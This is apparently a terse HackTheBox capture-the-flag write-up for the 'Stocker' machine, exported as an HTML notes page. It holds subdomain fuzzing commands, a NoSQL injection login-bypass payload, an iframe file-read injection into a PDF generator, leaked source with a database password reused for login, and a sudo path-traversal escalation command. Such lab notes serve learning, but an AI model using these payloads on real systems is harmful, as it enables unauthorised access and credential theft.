@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="color-scheme" content="dark">
+<title>stocker · the-grizzly-bear</title>
+<meta name="description" content="stocker — Cybersecurity Notes &amp; CTF Writeups">
+<link rel="stylesheet" href="../../assets/style.css">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><text y='14' font-size='14'>&#127988;</text></svg>">
+</head>
+<body>
+<button id="menu-toggle" aria-label="Toggle navigation">&#9776;</button>
+<div class="layout">
+<aside class="sidebar" id="sidebar">
+  <a class="brand" href="../../index.html">
+    <span class="brand-flag">&#127988;</span>
+    <span class="brand-text"><strong>the-grizzly-bear</strong><small>Cybersecurity Notes &amp; CTF Writeups</small></span>
+  </a>
+  <nav class="nav" id="nav-root" data-current="htb/completed-machines/stocker.html" data-root="../.."></nav>
+</aside>
+<main class="content">
+  <article class="doc">
+  <div class="breadcrumb"><a href="../../index.html">the-grizzly-bear</a> &rsaquo; <a href="../index.html">HackTheBox</a> &rsaquo; <a href="index.html">Completed Machines</a></div>
+<h1 id="title">stocker</h1>
+
+<p class="figure"><a class="img-link" href="stocker/untitled.png"><img src="stocker/untitled.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="stocker/untitled-1.png"><img src="stocker/untitled-1.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="stocker/untitled-2.png"><img src="stocker/untitled-2.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="stocker/untitled-3.png"><img src="stocker/untitled-3.png" alt="Untitled" loading="lazy"></a></p>
+<p>ffuf -u <a href="http://stocker.htb/" target="_blank" rel="noopener">http://stocker.htb</a> -w ../bitquark-subdomains-top100000.txt -H "HOST: FUZZ.stocker.htb" -mc 302</p>
+<p class="figure"><a class="img-link" href="stocker/untitled-4.png"><img src="stocker/untitled-4.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="stocker/untitled-5.png"><img src="stocker/untitled-5.png" alt="Untitled" loading="lazy"></a></p>
+<p>ffuf -u <a href="http://dev.stocker.htb/login" target="_blank" rel="noopener">http://dev.stocker.htb/login</a> -c -w /home/htb-theblackcat/my_data/NoSQL.txt -X POST -d 'username=adminFUZZ&amp;password=admin' -H 'Content-Type: application/x-www-form-urlencoded'</p>
+<p class="figure"><a class="img-link" href="stocker/untitled-6.png"><img src="stocker/untitled-6.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="stocker/untitled-7.png"><img src="stocker/untitled-7.png" alt="Untitled" loading="lazy"></a></p>
+<p>ffuf -u <a href="http://dev.stocker.htb/login" target="_blank" rel="noopener">http://dev.stocker.htb/login</a> -c -w /home/htb-theblackcat/my_data/NoSQL.txt -X POST -d ‘{"username":{"$ne":"null"},"password":{"$ne":"null"}}' -H 'Content-Type: application/json'</p>
+<p>gobuster vhost -u stocker.htb -w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt --append-domain</p>
+<p><a href="https://github.com/OWASP/Amass/blob/master/examples/wordlists/subdomains-top1mil-20000.txt" target="_blank" rel="noopener">https://github.com/OWASP/Amass/blob/master/examples/wordlists/subdomains-top1mil-20000.txt</a></p>
+<p class="figure"><a class="img-link" href="stocker/untitled-8.png"><img src="stocker/untitled-8.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="stocker/untitled-9.png"><img src="stocker/untitled-9.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="stocker/untitled-10.png"><img src="stocker/untitled-10.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="stocker/untitled-11.png"><img src="stocker/untitled-11.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="stocker/untitled-12.png"><img src="stocker/untitled-12.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="stocker/untitled-13.png"><img src="stocker/untitled-13.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="stocker/untitled-14.png"><img src="stocker/untitled-14.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="stocker/untitled-15.png"><img src="stocker/untitled-15.png" alt="Untitled" loading="lazy"></a></p>
+<p><a href="http://dev.stocker.htb/api/po/63f10bf08708b73de16f2c16" target="_blank" rel="noopener">http://dev.stocker.htb/api/po/63f10bf08708b73de16f2c16</a></p>
+<p class="figure"><a class="img-link" href="stocker/untitled-16.png"><img src="stocker/untitled-16.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="stocker/untitled-17.png"><img src="stocker/untitled-17.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="stocker/untitled-18.png"><img src="stocker/untitled-18.png" alt="Untitled" loading="lazy"></a></p>
+<p>user angoose</p>
+<p>"&lt;iframe src=file:///var/www/dev/index.js height=1000px width=800px&gt;&lt;/iframe&gt;”</p>
+<p class="figure"><a class="img-link" href="stocker/untitled-19.png"><img src="stocker/untitled-19.png" alt="Untitled" loading="lazy"></a></p>
+<p>const express = require("express");<br>
+const mongoose = require("mongoose");<br>
+const session = require("express-session");<br>
+const MongoStore = require("connect-mongo");<br>
+const path = require("path");<br>
+const fs = require("fs");<br>
+const { generatePDF, formatHTML } = require("./pdf.js");<br>
+const { randomBytes, createHash } = require("crypto");<br>
+const app = express();<br>
+const port = 3000;<br>
+// TODO: Configure loading from dotenv for production<br>
+const dbURI = "mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?authSource=admin&amp;w=1";<br>
+app.use(express.json());<br>
+app.use(express.urlencoded({ extended: false }));<br>
+app.use(<br>
+session({<br>
+secret: randomBytes(32).toString("hex"),<br>
+resave: false,<br>
+saveUninitialized: true,<br>
+store: MongoStore.create({<br>
+mongoUrl: dbURI,<br>
+}),<br>
+})<br>
+);<br>
+app.use("/static", express.static(__dirname + "/assets"));<br>
+app.get("/", (req, res) =&gt; {<br>
+return res.redirect("/login");<br>
+});<br>
+app.get("/api/products", async (req, res) =&gt; {<br>
+if (!req.session.user) return res.json([]);<br>
+const products = await mongoose.model("Product").find();<br>
+return res.json(products);</p>
+<p>});<br>
+app.get("/login", (req, res) =&gt; {<br>
+if (req.session.user) return res.redirect("/stock");<br>
+return res.sendFile(__dirname + "/templates/login.html");<br>
+});<br>
+app.post("/login", async (req, res) =&gt; {<br>
+const { username, password } = req.body;<br>
+if (!username || !password) return res.redirect("/login?error=login-error");<br>
+// TODO: Implement hashing<br>
+const user = await mongoose.model("User").findOne({ username, password });<br>
+if (!user) return res.redirect("/login?error=login-error");<br>
+req.session.user = <a href="http://user.id/" target="_blank" rel="noopener">user.id</a>;<br>
+console.log(req.session);<br>
+return res.redirect("/stock");<br>
+});<br>
+app.post("/api/order", async (req, res) =&gt; {<br>
+if (!req.session.user) return res.json({});</p>
+<p>angoose</p>
+<p>IHeardPassphrasesArePrettySecure</p>
+<p class="figure"><a class="img-link" href="stocker/untitled-20.png"><img src="stocker/untitled-20.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="stocker/untitled-21.png"><img src="stocker/untitled-21.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="stocker/untitled-22.png"><img src="stocker/untitled-22.png" alt="Untitled" loading="lazy"></a></p>
+<p>sudo /usr/bin/node /usr/local/scripts/../../../../../home/angoose/escalation.js</p>
+<p class="figure"><a class="img-link" href="stocker/untitled-23.png"><img src="stocker/untitled-23.png" alt="Untitled" loading="lazy"></a></p>
+<p>effin sticky</p>
+<p class="figure"><a class="img-link" href="stocker/untitled-24.png"><img src="stocker/untitled-24.png" alt="Untitled" loading="lazy"></a></p>
+  </article>
+  <footer class="foot">Built from a Notion export · <a href="https://github.com/the-grizzly-bear">github.com/the-grizzly-bear</a></footer>
+</main>
+</div>
+<script src="../../assets/nav.js" defer></script>
+<script>
+document.getElementById('menu-toggle').addEventListener('click',function(){
+  document.getElementById('sidebar').classList.toggle('open');
+});
+</script>
+</body>
+</html>
